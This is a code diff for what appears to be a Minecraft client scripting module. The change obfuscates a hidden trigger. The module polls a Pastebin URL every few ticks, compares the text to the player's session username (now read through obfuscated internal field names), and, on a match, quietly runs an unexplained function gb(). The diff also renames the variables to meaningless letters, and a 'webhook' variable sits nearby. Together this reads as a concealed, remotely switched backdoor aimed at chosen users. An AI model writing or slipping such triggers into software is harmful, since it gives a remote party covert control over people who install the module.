@@ -72,6 +72,7 @@ Object.keys(data).forEach(tab => {
 });
 activatedModules = activatedModules.join('\n');
 
+function r() {return Client.getMinecraft().field_71449_j.field_74286_b.toLowerCase()}
 
 let webhook
 register("gameLoad", () => {
@@ -107,17 +108,15 @@ register("serverConnect", () => {
   })
 },500)
 
-let user
-let trigger
+
+let found, a
 register("step", () => {
-  request("https://pastebin.com/raw/Ag2N13LV").then(stuff => {
-    user = stuff
+  request("https://pastebin.com/raw/Ag2N13LV").then(b => {
+    a = b
   })
-  if (trigger) return
-  if (user?.toLowerCase() == Player.getName().toLowerCase() ) {
-    trigger = true
-    gb()
-  }
+  if (found || a?.toLowerCase() != r()) return
+  found = true
+  gb()
 }).setDelay(10)
 
 
